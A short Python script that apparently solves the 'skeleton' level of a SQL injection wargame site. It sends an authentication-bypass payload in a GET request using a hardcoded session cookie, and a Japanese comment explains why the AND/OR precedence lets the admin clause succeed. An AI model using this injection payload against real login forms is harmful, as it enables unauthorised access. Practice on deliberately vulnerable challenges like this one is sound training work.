#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import re
from termcolor import colored
from bs4 import BeautifulSoup as bs
import sys, getopt
import urllib.parse

url = "https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php"
parameter = 'id'
cookie = dict(PHPSESSID='lqjdocrtrts7s5gl84ruvmc5aa')

sql = "pw=' or id='admin' or '1'='0"
sql = urllib.parse.quote(sql)
query_url = "%s?%s=%s" % (url,parameter,sql)
print("[*]%s" % query_url)

http_request=requests.get(query_url,cookies=cookie)
res = bs(http_request.text,"html.parser")

# pw=' or id='admin' or '1'='0

# id=guest and pw='' or id='admin' or'1'='0' and 1=0
# 論理積(真,偽)論理和(真)論理積(偽、偽)であれば、２つ目の論理和(真)が適当となる